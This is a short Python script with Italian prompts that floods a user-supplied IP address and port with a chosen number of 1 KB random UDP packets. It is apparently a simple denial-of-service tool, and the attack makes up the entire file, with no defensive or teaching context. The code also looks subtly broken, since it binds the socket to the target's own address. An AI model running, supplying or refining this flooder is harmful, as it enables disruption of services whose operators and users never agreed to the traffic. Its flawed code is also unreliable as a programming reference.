import socket
import random
ip = input ("\nInserisci l'indirizzo IP del target: ")
port = int (input ("\nInserisci la porta del target: "))
n = int (input ("\nInserisci il numero di pacchetti UDP da inviare: "))
while 0<n: #quando n raggiunge 0 si ferma il cliclo
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind((ip, port))
        data = random.randbytes(1024)# 1kb di data
        addr = (str(ip), int(port))
        for x in range(n):
                s.sendto(data, addr)
                n-=1 #Tolgo un valore all'input n
        s.close()
